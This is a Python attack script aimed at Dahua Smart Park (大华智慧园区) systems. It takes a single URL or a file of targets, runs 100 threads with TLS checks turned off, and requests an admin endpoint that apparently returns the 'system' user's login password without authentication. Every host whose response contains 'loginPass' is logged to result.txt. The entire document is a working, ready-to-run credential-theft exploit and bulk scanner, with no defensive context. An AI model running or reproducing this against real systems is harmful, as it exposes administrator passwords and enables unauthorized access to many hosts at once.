import requests,argparse,sys,re,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """______________  __                     _________                                
___  __ \__  / / /  __________________ ______  /  ______________ _______________
__  / / /_  /_/ /   __  ___/  _ \  __ `/  __  /   ___  __ \  __ `/_  ___/_  ___/
_  /_/ /_  __  /    _  /   /  __/ /_/ // /_/ /    __  /_/ / /_/ /_(__  )_(__  ) 
/_____/ /_/ /_/     /_/    \___/\__,_/ \__,_/     _  .___/\__,_/ /____/ /____/  
                                                  /_/                           """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='大华智慧园区任意密码读取攻击')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/admin/user_getUserInfoByUserName.action?userName=system'
    try:
        res = requests.get(url=target+payload,verify=False,timeout=10)
        if 'loginPass' in res.text and res.status_code == 200:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            return False
    except Exception as e:
        return False

if __name__ == '__main__':
    main()